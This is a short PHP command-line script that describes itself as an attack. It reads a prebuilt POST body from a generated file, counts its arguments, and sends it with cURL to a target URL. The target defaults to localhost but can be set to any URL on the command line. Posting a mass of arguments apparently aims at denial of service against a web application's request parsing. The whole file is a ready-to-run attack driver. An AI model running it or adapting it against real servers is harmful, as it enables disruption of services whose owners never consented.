<?php
//require_once 'functions.php';
if (!is_file('send_string.php')) {
  echo "unable to attack without the send_string, do generate_send_string.php first\n";
  exit(1);
}
require 'send_string.php';
$numArgs = substr_count($sendString,'&');
$uri = 'http://localhost/index.php?attack-my-self-cuz-its-fun=true';
if (!empty($argv[1])) {
  $uri = $argv[1];
}
echo "will attack $uri\nwith $numArgs arguments :) :)\n\n";
$opts = array(
  CURLOPT_URL => $uri,
  CURLOPT_POST => true,
  CURLOPT_POSTFIELDS => $sendString,
  CURLOPT_HEADER => false,
);
$ch = curl_init();
curl_setopt_array($ch, $opts);
echo "\n-- response --\n";
curl_exec($ch);
curl_close($ch);
echo"\n";
